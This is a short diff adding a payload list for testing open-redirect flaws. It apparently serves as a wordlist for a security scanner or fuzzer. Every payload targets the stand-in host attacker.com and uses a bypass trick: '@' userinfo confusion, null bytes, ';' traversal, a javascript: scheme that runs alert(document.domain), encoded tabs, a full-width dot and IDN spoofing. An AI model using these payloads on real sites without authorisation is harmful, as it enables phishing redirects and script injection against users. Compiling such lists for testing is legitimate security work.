@@ -1,0 +1,22 @@
+# Custom Open Redirect Payloads for Testing
+# Format: One payload per line, comments start with #
+
+# Basic payloads
+https://attacker.com
+//attacker.com
+http://attacker.com
+
+# Advanced evasion techniques
+https://google.com@attacker.com
+https://attacker.com%00.google.com
+https://attacker.com/..;/google.com
+javascript://attacker.com/%0aalert(document.domain)
+/%09/attacker.com
+
+# Special characters
+https://attacker.com。
+https://xn--80ak6aa92e.com  # IDN domain
+
+# Custom bypasses for specific scenarios
+@attacker.com;
+https://attacker.com#@google.com
